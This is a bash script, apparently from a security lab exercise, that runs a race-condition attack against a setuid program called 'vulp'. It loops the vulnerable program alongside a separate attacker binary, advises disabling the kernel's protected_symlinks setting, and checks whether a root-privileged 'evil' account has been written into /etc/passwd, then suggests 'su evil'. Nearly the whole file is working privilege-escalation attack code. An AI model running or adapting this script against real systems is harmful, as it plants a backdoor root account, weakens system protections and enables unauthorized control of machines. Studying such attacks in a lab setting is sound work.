#!/bin/bash

# Fixed attack script - attack.sh

echo "=== Race Condition Attack - Fixed Version ==="
echo

# Verificaciones iniciales
if [ "$EUID" -eq 0 ]; then
    echo "ERROR: Don't run as root!"
    exit 1
fi

# Verificar setuid
if [ ! -u "vulp" ]; then
    echo "ERROR: vulp needs setuid bit"
    echo "Run: sudo chown root:root vulp && sudo chmod u+s vulp"
    exit 1
fi

if [ "$SYMLINK_PROTECTION" = "1" ]; then
    echo "WARNING: protected_symlinks is enabled"
    echo "Consider running: sudo sysctl -w fs.protected_symlinks=0"
    echo "Continue anyway? (y/n)"
    read -n 1 answer
    echo
    if [ "$answer" != "y" ]; then
        exit 1
    fi
fi


echo
echo "[+] Starting coordinated attack..."
echo "[+] This may take several minutes..."
echo

# Función para ejecutar vulp repetidamente
run_vulp() {
    local count=0
    while [ $count -lt 10000 ]; do
        ./vulp < evil_input.txt >/dev/null 2>&1
        sleep 0.01
        count=$((count + 1))
    done
}

# Ejecutar ataque en paralelo
./attack &
ATTACK_PID=$!

# Dar tiempo al atacante para iniciar
sleep 1

# Ejecutar vulp en background
run_vulp &
VULP_PID=$!

# Esperar un poco y verificar progreso
sleep 10

# Verificar si hay cambios
echo
echo "[+] Checking for success..."

if tail -5 /etc/passwd | grep -q "evil:x:0:0"; then
    echo "SUCCESS! Malicious entry found:"
    tail -5 /etc/passwd | grep "evil"
    echo
    echo "Attack successful! You can now try:"
    echo "su evil"
    SUCCESS=1
else
    echo "No success yet, continuing..."
    SUCCESS=0
fi

# Esperar más tiempo si no tuvo éxito
if [ $SUCCESS -eq 0 ]; then
    echo "[+] Continuing attack for 30 more seconds..."
    sleep 30
    
    echo "[+] Final check..."
    if tail -5 /etc/passwd | grep -q "evil:x:0:0"; then
        echo "SUCCESS! Attack succeeded:"
        tail -5 /etc/passwd | grep "evil"
    else
        echo "Attack failed this time."
        echo "Suggestions:"
        echo "1. Try running again (timing-dependent)"
        echo "2. Disable protected_symlinks: sudo sysctl -w fs.protected_symlinks=0"
        echo "3. Increase DELAY in vulp.c and recompile"
    fi
fi
